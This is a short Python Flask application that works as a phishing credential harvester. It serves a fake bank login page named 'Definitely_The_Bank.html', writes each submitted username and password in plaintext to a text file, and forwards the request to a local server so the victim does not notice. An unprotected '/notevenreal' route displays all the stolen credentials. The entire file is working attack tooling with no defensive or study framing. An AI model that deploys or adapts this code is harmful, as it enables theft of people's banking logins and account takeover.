from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def logger():

    if (request.method == "POST"):
        username = request.form.get("username")
        password = request.form.get("password")
        with open("Users_Pass.txt", 'a') as file_opened:
            file_opened.write("Username: " + username + "  Password: " + password + "\n </br>")
        
        return redirect("http://localhost:2222", 307)
    return render_template("Definitely_The_Bank.html")
    
@app.route("/notevenreal")

def definitely_real():
    with open("Users_Pass.txt", 'r') as f:
        return f.read()
        
if __name__ == '__main__':
    #app.run()
    app.run(debug=True)